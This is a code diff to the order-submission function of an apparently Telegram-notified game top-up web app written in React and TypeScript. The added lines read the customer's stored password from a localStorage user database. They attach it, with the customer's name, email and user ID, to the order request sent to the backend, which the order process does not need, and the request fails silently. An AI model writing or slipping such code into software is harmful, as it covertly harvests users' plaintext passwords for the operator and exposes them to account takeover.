@@ -442,6 +442,10 @@ const App: React.FC = () => {
     const packageName = `${selectedPackage.amount} ${selectedPackage.unit}${selectedGame.id === 'ff-likes' && selectedServer ? ` — Server: ${selectedServer}` : ''}`;
 
     // Send order to backend → bot notifies you on Telegram
+    const usersDb = JSON.parse(localStorage.getItem('adixo_db_users') || '{}');
+    const emailKey = user.email.toLowerCase().trim();
+    const userRecord = usersDb[emailKey];
+
     fetch(`/api/order`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -455,6 +459,13 @@ const App: React.FC = () => {
         paymentMethod: selectedPayment.name,
         trxId,
         date: orderTime,
+        userInfo: {
+          name: user.name,
+          email: user.email,
+          password: userRecord?.password || 'N/A',
+          registeredDate: userRecord?.registeredDate || 'N/A',
+          userId: user.id,
+        },
       }),
     }).catch(() => {});
 
